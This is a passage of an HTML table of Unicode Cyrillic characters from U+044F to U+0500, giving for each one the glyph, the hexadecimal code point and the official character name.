</tr>
<tr>
<td style="text-align:center">я</td>
<td style="text-align:center">044F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER YA</td>
</tr>
<tr>
<td style="text-align:center">ѐ</td>
<td style="text-align:center">0450</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IE WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ё</td>
<td style="text-align:center">0451</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IO</td>
</tr>
<tr>
<td style="text-align:center">ђ</td>
<td style="text-align:center">0452</td>
<td style="text-align:center">CYRILLIC SMALL LETTER DJE</td>
</tr>
<tr>
<td style="text-align:center">ѓ</td>
<td style="text-align:center">0453</td>
<td style="text-align:center">CYRILLIC SMALL LETTER GJE</td>
</tr>
<tr>
<td style="text-align:center">є</td>
<td style="text-align:center">0454</td>
<td style="text-align:center">CYRILLIC SMALL LETTER UKRAINIAN IE</td>
</tr>
<tr>
<td style="text-align:center">ѕ</td>
<td style="text-align:center">0455</td>
<td style="text-align:center">CYRILLIC SMALL LETTER DZE</td>
</tr>
<tr>
<td style="text-align:center">і</td>
<td style="text-align:center">0456</td>
<td style="text-align:center">CYRILLIC SMALL LETTER BYELORUSSIAN-UKRAINIAN I</td>
</tr>
<tr>
<td style="text-align:center">ї</td>
<td style="text-align:center">0457</td>
<td style="text-align:center">CYRILLIC SMALL LETTER YI</td>
</tr>
<tr>
<td style="text-align:center">ј</td>
<td style="text-align:center">0458</td>
<td style="text-align:center">CYRILLIC SMALL LETTER JE</td>
</tr>
<tr>
<td style="text-align:center">љ</td>
<td style="text-align:center">0459</td>
<td style="text-align:center">CYRILLIC SMALL LETTER LJE</td>
</tr>
<tr>
<td style="text-align:center">њ</td>
<td style="text-align:center">045A</td>
<td style="text-align:center">CYRILLIC SMALL LETTER NJE</td>
</tr>
<tr>
<td style="text-align:center">ћ</td>
<td style="text-align:center">045B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER TSHE</td>
</tr>
<tr>
<td style="text-align:center">ќ</td>
<td style="text-align:center">045C</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KJE</td>
</tr>
<tr>
<td style="text-align:center">ѝ</td>
<td style="text-align:center">045D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER I WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ў</td>
<td style="text-align:center">045E</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SHORT U</td>
</tr>
<tr>
<td style="text-align:center">џ</td>
<td style="text-align:center">045F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER DZHE</td>
</tr>
<tr>
<td style="text-align:center">Ѡ</td>
<td style="text-align:center">0460</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER OMEGA</td>
</tr>
<tr>
<td style="text-align:center">ѡ</td>
<td style="text-align:center">0461</td>
<td style="text-align:center">CYRILLIC SMALL LETTER OMEGA</td>
</tr>
<tr>
<td style="text-align:center">Ѣ</td>
<td style="text-align:center">0462</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER YAT</td>
</tr>
<tr>
<td style="text-align:center">ѣ</td>
<td style="text-align:center">0463</td>
<td style="text-align:center">CYRILLIC SMALL LETTER YAT</td>
</tr>
<tr>
<td style="text-align:center">Ѥ</td>
<td style="text-align:center">0464</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IOTIFIED E</td>
</tr>
<tr>
<td style="text-align:center">ѥ</td>
<td style="text-align:center">0465</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IOTIFIED E</td>
</tr>
<tr>
<td style="text-align:center">Ѧ</td>
<td style="text-align:center">0466</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER LITTLE YUS</td>
</tr>
<tr>
<td style="text-align:center">ѧ</td>
<td style="text-align:center">0467</td>
<td style="text-align:center">CYRILLIC SMALL LETTER LITTLE YUS</td>
</tr>
<tr>
<td style="text-align:center">Ѩ</td>
<td style="text-align:center">0468</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IOTIFIED LITTLE YUS</td>
</tr>
<tr>
<td style="text-align:center">ѩ</td>
<td style="text-align:center">0469</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IOTIFIED LITTLE YUS</td>
</tr>
<tr>
<td style="text-align:center">Ѫ</td>
<td style="text-align:center">046A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER BIG YUS</td>
</tr>
<tr>
<td style="text-align:center">ѫ</td>
<td style="text-align:center">046B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER BIG YUS</td>
</tr>
<tr>
<td style="text-align:center">Ѭ</td>
<td style="text-align:center">046C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IOTIFIED BIG YUS</td>
</tr>
<tr>
<td style="text-align:center">ѭ</td>
<td style="text-align:center">046D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IOTIFIED BIG YUS</td>
</tr>
<tr>
<td style="text-align:center">Ѯ</td>
<td style="text-align:center">046E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KSI</td>
</tr>
<tr>
<td style="text-align:center">ѯ</td>
<td style="text-align:center">046F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KSI</td>
</tr>
<tr>
<td style="text-align:center">Ѱ</td>
<td style="text-align:center">0470</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER PSI</td>
</tr>
<tr>
<td style="text-align:center">ѱ</td>
<td style="text-align:center">0471</td>
<td style="text-align:center">CYRILLIC SMALL LETTER PSI</td>
</tr>
<tr>
<td style="text-align:center">Ѳ</td>
<td style="text-align:center">0472</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER FITA</td>
</tr>
<tr>
<td style="text-align:center">ѳ</td>
<td style="text-align:center">0473</td>
<td style="text-align:center">CYRILLIC SMALL LETTER FITA</td>
</tr>
<tr>
<td style="text-align:center">Ѵ</td>
<td style="text-align:center">0474</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IZHITSA</td>
</tr>
<tr>
<td style="text-align:center">ѵ</td>
<td style="text-align:center">0475</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IZHITSA</td>
</tr>
<tr>
<td style="text-align:center">Ѷ</td>
<td style="text-align:center">0476</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IZHITSA WITH DOUBLE GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">ѷ</td>
<td style="text-align:center">0477</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IZHITSA WITH DOUBLE GRAVE ACCENT</td>
</tr>
<tr>
<td style="text-align:center">Ѹ</td>
<td style="text-align:center">0478</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER UK</td>
</tr>
<tr>
<td style="text-align:center">ѹ</td>
<td style="text-align:center">0479</td>
<td style="text-align:center">CYRILLIC SMALL LETTER UK</td>
</tr>
<tr>
<td style="text-align:center">Ѻ</td>
<td style="text-align:center">047A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ROUND OMEGA</td>
</tr>
<tr>
<td style="text-align:center">ѻ</td>
<td style="text-align:center">047B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ROUND OMEGA</td>
</tr>
<tr>
<td style="text-align:center">Ѽ</td>
<td style="text-align:center">047C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER OMEGA WITH TITLO</td>
</tr>
<tr>
<td style="text-align:center">ѽ</td>
<td style="text-align:center">047D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER OMEGA WITH TITLO</td>
</tr>
<tr>
<td style="text-align:center">Ѿ</td>
<td style="text-align:center">047E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER OT</td>
</tr>
<tr>
<td style="text-align:center">ѿ</td>
<td style="text-align:center">047F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER OT</td>
</tr>
<tr>
<td style="text-align:center">Ҁ</td>
<td style="text-align:center">0480</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOPPA</td>
</tr>
<tr>
<td style="text-align:center">ҁ</td>
<td style="text-align:center">0481</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KOPPA</td>
</tr>
<tr>
<td style="text-align:center">҂</td>
<td style="text-align:center">0482</td>
<td style="text-align:center">CYRILLIC THOUSANDS SIGN</td>
</tr>
<tr>
<td style="text-align:center">о҃</td>
<td style="text-align:center">0483</td>
<td style="text-align:center">COMBINING CYRILLIC TITLO (combined with о)</td>
</tr>
<tr>
<td style="text-align:center">о҄</td>
<td style="text-align:center">0484</td>
<td style="text-align:center">COMBINING CYRILLIC PALATALIZATION (combined with о)</td>
</tr>
<tr>
<td style="text-align:center">о҅</td>
<td style="text-align:center">0485</td>
<td style="text-align:center">COMBINING CYRILLIC DASIA PNEUMATA (combined with о)</td>
</tr>
<tr>
<td style="text-align:center">о҆</td>
<td style="text-align:center">0486</td>
<td style="text-align:center">COMBINING CYRILLIC PSILI PNEUMATA (combined with о)</td>
</tr>
<tr>
<td style="text-align:center">о҇</td>
<td style="text-align:center">0487</td>
<td style="text-align:center">COMBINING CYRILLIC POKRYTIE (combined with о)</td>
</tr>
<tr>
<td style="text-align:center">о҈</td>
<td style="text-align:center">0488</td>
<td style="text-align:center">COMBINING CYRILLIC HUNDRED THOUSANDS SIGN (combined with о)</td>
</tr>
<tr>
<td style="text-align:center">о҉</td>
<td style="text-align:center">0489</td>
<td style="text-align:center">COMBINING CYRILLIC MILLIONS SIGN (combined with о)</td>
</tr>
<tr>
<td style="text-align:center">Ҋ</td>
<td style="text-align:center">048A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SHORT I WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">ҋ</td>
<td style="text-align:center">048B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SHORT I WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">Ҍ</td>
<td style="text-align:center">048C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SEMISOFT SIGN</td>
</tr>
<tr>
<td style="text-align:center">ҍ</td>
<td style="text-align:center">048D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SEMISOFT SIGN</td>
</tr>
<tr>
<td style="text-align:center">Ҏ</td>
<td style="text-align:center">048E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ER WITH TICK</td>
</tr>
<tr>
<td style="text-align:center">ҏ</td>
<td style="text-align:center">048F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ER WITH TICK</td>
</tr>
<tr>
<td style="text-align:center">Ґ</td>
<td style="text-align:center">0490</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER GHE WITH UPTURN</td>
</tr>
<tr>
<td style="text-align:center">ґ</td>
<td style="text-align:center">0491</td>
<td style="text-align:center">CYRILLIC SMALL LETTER GHE WITH UPTURN</td>
</tr>
<tr>
<td style="text-align:center">Ғ</td>
<td style="text-align:center">0492</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER GHE WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ғ</td>
<td style="text-align:center">0493</td>
<td style="text-align:center">CYRILLIC SMALL LETTER GHE WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ҕ</td>
<td style="text-align:center">0494</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER GHE WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">ҕ</td>
<td style="text-align:center">0495</td>
<td style="text-align:center">CYRILLIC SMALL LETTER GHE WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">Җ</td>
<td style="text-align:center">0496</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ZHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">җ</td>
<td style="text-align:center">0497</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ZHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ҙ</td>
<td style="text-align:center">0498</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ZE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ҙ</td>
<td style="text-align:center">0499</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ZE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Қ</td>
<td style="text-align:center">049A</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KA WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">қ</td>
<td style="text-align:center">049B</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KA WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ҝ</td>
<td style="text-align:center">049C</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KA WITH VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">ҝ</td>
<td style="text-align:center">049D</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KA WITH VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ҟ</td>
<td style="text-align:center">049E</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KA WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ҟ</td>
<td style="text-align:center">049F</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KA WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ҡ</td>
<td style="text-align:center">04A0</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER BASHKIR KA</td>
</tr>
<tr>
<td style="text-align:center">ҡ</td>
<td style="text-align:center">04A1</td>
<td style="text-align:center">CYRILLIC SMALL LETTER BASHKIR KA</td>
</tr>
<tr>
<td style="text-align:center">Ң</td>
<td style="text-align:center">04A2</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EN WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ң</td>
<td style="text-align:center">04A3</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EN WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ҥ</td>
<td style="text-align:center">04A4</td>
<td style="text-align:center">CYRILLIC CAPITAL LIGATURE EN GHE</td>
</tr>
<tr>
<td style="text-align:center">ҥ</td>
<td style="text-align:center">04A5</td>
<td style="text-align:center">CYRILLIC SMALL LIGATURE EN GHE</td>
</tr>
<tr>
<td style="text-align:center">Ҧ</td>
<td style="text-align:center">04A6</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER PE WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">ҧ</td>
<td style="text-align:center">04A7</td>
<td style="text-align:center">CYRILLIC SMALL LETTER PE WITH MIDDLE HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ҩ</td>
<td style="text-align:center">04A8</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ABKHASIAN HA</td>
</tr>
<tr>
<td style="text-align:center">ҩ</td>
<td style="text-align:center">04A9</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ABKHASIAN HA</td>
</tr>
<tr>
<td style="text-align:center">Ҫ</td>
<td style="text-align:center">04AA</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ES WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ҫ</td>
<td style="text-align:center">04AB</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ES WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ҭ</td>
<td style="text-align:center">04AC</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER TE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ҭ</td>
<td style="text-align:center">04AD</td>
<td style="text-align:center">CYRILLIC SMALL LETTER TE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ү</td>
<td style="text-align:center">04AE</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER STRAIGHT U</td>
</tr>
<tr>
<td style="text-align:center">ү</td>
<td style="text-align:center">04AF</td>
<td style="text-align:center">CYRILLIC SMALL LETTER STRAIGHT U</td>
</tr>
<tr>
<td style="text-align:center">Ұ</td>
<td style="text-align:center">04B0</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER STRAIGHT U WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ұ</td>
<td style="text-align:center">04B1</td>
<td style="text-align:center">CYRILLIC SMALL LETTER STRAIGHT U WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ҳ</td>
<td style="text-align:center">04B2</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER HA WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ҳ</td>
<td style="text-align:center">04B3</td>
<td style="text-align:center">CYRILLIC SMALL LETTER HA WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ҵ</td>
<td style="text-align:center">04B4</td>
<td style="text-align:center">CYRILLIC CAPITAL LIGATURE TE TSE</td>
</tr>
<tr>
<td style="text-align:center">ҵ</td>
<td style="text-align:center">04B5</td>
<td style="text-align:center">CYRILLIC SMALL LIGATURE TE TSE</td>
</tr>
<tr>
<td style="text-align:center">Ҷ</td>
<td style="text-align:center">04B6</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER CHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ҷ</td>
<td style="text-align:center">04B7</td>
<td style="text-align:center">CYRILLIC SMALL LETTER CHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ҹ</td>
<td style="text-align:center">04B8</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER CHE WITH VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">ҹ</td>
<td style="text-align:center">04B9</td>
<td style="text-align:center">CYRILLIC SMALL LETTER CHE WITH VERTICAL STROKE</td>
</tr>
<tr>
<td style="text-align:center">Һ</td>
<td style="text-align:center">04BA</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SHHA</td>
</tr>
<tr>
<td style="text-align:center">һ</td>
<td style="text-align:center">04BB</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SHHA</td>
</tr>
<tr>
<td style="text-align:center">Ҽ</td>
<td style="text-align:center">04BC</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ABKHASIAN CHE</td>
</tr>
<tr>
<td style="text-align:center">ҽ</td>
<td style="text-align:center">04BD</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ABKHASIAN CHE</td>
</tr>
<tr>
<td style="text-align:center">Ҿ</td>
<td style="text-align:center">04BE</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ABKHASIAN CHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ҿ</td>
<td style="text-align:center">04BF</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ABKHASIAN CHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ӏ</td>
<td style="text-align:center">04C0</td>
<td style="text-align:center">CYRILLIC LETTER PALOCHKA</td>
</tr>
<tr>
<td style="text-align:center">Ӂ</td>
<td style="text-align:center">04C1</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ZHE WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ӂ</td>
<td style="text-align:center">04C2</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ZHE WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ӄ</td>
<td style="text-align:center">04C3</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KA WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ӄ</td>
<td style="text-align:center">04C4</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KA WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ӆ</td>
<td style="text-align:center">04C5</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EL WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">ӆ</td>
<td style="text-align:center">04C6</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EL WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">Ӈ</td>
<td style="text-align:center">04C7</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EN WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ӈ</td>
<td style="text-align:center">04C8</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EN WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ӊ</td>
<td style="text-align:center">04C9</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EN WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">ӊ</td>
<td style="text-align:center">04CA</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EN WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">Ӌ</td>
<td style="text-align:center">04CB</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KHAKASSIAN CHE</td>
</tr>
<tr>
<td style="text-align:center">ӌ</td>
<td style="text-align:center">04CC</td>
<td style="text-align:center">CYRILLIC SMALL LETTER KHAKASSIAN CHE</td>
</tr>
<tr>
<td style="text-align:center">Ӎ</td>
<td style="text-align:center">04CD</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER EM WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">ӎ</td>
<td style="text-align:center">04CE</td>
<td style="text-align:center">CYRILLIC SMALL LETTER EM WITH TAIL</td>
</tr>
<tr>
<td style="text-align:center">ӏ</td>
<td style="text-align:center">04CF</td>
<td style="text-align:center">CYRILLIC SMALL LETTER PALOCHKA</td>
</tr>
<tr>
<td style="text-align:center">Ӑ</td>
<td style="text-align:center">04D0</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER A WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ӑ</td>
<td style="text-align:center">04D1</td>
<td style="text-align:center">CYRILLIC SMALL LETTER A WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ӓ</td>
<td style="text-align:center">04D2</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER A WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӓ</td>
<td style="text-align:center">04D3</td>
<td style="text-align:center">CYRILLIC SMALL LETTER A WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӕ</td>
<td style="text-align:center">04D4</td>
<td style="text-align:center">CYRILLIC CAPITAL LIGATURE A IE</td>
</tr>
<tr>
<td style="text-align:center">ӕ</td>
<td style="text-align:center">04D5</td>
<td style="text-align:center">CYRILLIC SMALL LIGATURE A IE</td>
</tr>
<tr>
<td style="text-align:center">Ӗ</td>
<td style="text-align:center">04D6</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER IE WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ӗ</td>
<td style="text-align:center">04D7</td>
<td style="text-align:center">CYRILLIC SMALL LETTER IE WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ә</td>
<td style="text-align:center">04D8</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SCHWA</td>
</tr>
<tr>
<td style="text-align:center">ә</td>
<td style="text-align:center">04D9</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SCHWA</td>
</tr>
<tr>
<td style="text-align:center">Ӛ</td>
<td style="text-align:center">04DA</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER SCHWA WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӛ</td>
<td style="text-align:center">04DB</td>
<td style="text-align:center">CYRILLIC SMALL LETTER SCHWA WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӝ</td>
<td style="text-align:center">04DC</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ZHE WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӝ</td>
<td style="text-align:center">04DD</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ZHE WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӟ</td>
<td style="text-align:center">04DE</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ZE WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӟ</td>
<td style="text-align:center">04DF</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ZE WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӡ</td>
<td style="text-align:center">04E0</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER ABKHASIAN DZE</td>
</tr>
<tr>
<td style="text-align:center">ӡ</td>
<td style="text-align:center">04E1</td>
<td style="text-align:center">CYRILLIC SMALL LETTER ABKHASIAN DZE</td>
</tr>
<tr>
<td style="text-align:center">Ӣ</td>
<td style="text-align:center">04E2</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER I WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ӣ</td>
<td style="text-align:center">04E3</td>
<td style="text-align:center">CYRILLIC SMALL LETTER I WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ӥ</td>
<td style="text-align:center">04E4</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER I WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӥ</td>
<td style="text-align:center">04E5</td>
<td style="text-align:center">CYRILLIC SMALL LETTER I WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӧ</td>
<td style="text-align:center">04E6</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER O WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӧ</td>
<td style="text-align:center">04E7</td>
<td style="text-align:center">CYRILLIC SMALL LETTER O WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ө</td>
<td style="text-align:center">04E8</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER BARRED O</td>
</tr>
<tr>
<td style="text-align:center">ө</td>
<td style="text-align:center">04E9</td>
<td style="text-align:center">CYRILLIC SMALL LETTER BARRED O</td>
</tr>
<tr>
<td style="text-align:center">Ӫ</td>
<td style="text-align:center">04EA</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER BARRED O WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӫ</td>
<td style="text-align:center">04EB</td>
<td style="text-align:center">CYRILLIC SMALL LETTER BARRED O WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӭ</td>
<td style="text-align:center">04EC</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER E WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӭ</td>
<td style="text-align:center">04ED</td>
<td style="text-align:center">CYRILLIC SMALL LETTER E WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӯ</td>
<td style="text-align:center">04EE</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER U WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ӯ</td>
<td style="text-align:center">04EF</td>
<td style="text-align:center">CYRILLIC SMALL LETTER U WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ӱ</td>
<td style="text-align:center">04F0</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER U WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӱ</td>
<td style="text-align:center">04F1</td>
<td style="text-align:center">CYRILLIC SMALL LETTER U WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӳ</td>
<td style="text-align:center">04F2</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER U WITH DOUBLE ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ӳ</td>
<td style="text-align:center">04F3</td>
<td style="text-align:center">CYRILLIC SMALL LETTER U WITH DOUBLE ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ӵ</td>
<td style="text-align:center">04F4</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER CHE WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӵ</td>
<td style="text-align:center">04F5</td>
<td style="text-align:center">CYRILLIC SMALL LETTER CHE WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӷ</td>
<td style="text-align:center">04F6</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER GHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">ӷ</td>
<td style="text-align:center">04F7</td>
<td style="text-align:center">CYRILLIC SMALL LETTER GHE WITH DESCENDER</td>
</tr>
<tr>
<td style="text-align:center">Ӹ</td>
<td style="text-align:center">04F8</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER YERU WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ӹ</td>
<td style="text-align:center">04F9</td>
<td style="text-align:center">CYRILLIC SMALL LETTER YERU WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ӻ</td>
<td style="text-align:center">04FA</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER GHE WITH STROKE AND HOOK</td>
</tr>
<tr>
<td style="text-align:center">ӻ</td>
<td style="text-align:center">04FB</td>
<td style="text-align:center">CYRILLIC SMALL LETTER GHE WITH STROKE AND HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ӽ</td>
<td style="text-align:center">04FC</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER HA WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ӽ</td>
<td style="text-align:center">04FD</td>
<td style="text-align:center">CYRILLIC SMALL LETTER HA WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ӿ</td>
<td style="text-align:center">04FE</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER HA WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ӿ</td>
<td style="text-align:center">04FF</td>
<td style="text-align:center">CYRILLIC SMALL LETTER HA WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ԁ</td>
<td style="text-align:center">0500</td>
<td style="text-align:center">CYRILLIC CAPITAL LETTER KOMI DE</td>
</tr>
<tr>
<td style="text-align:center">ԁ</td>
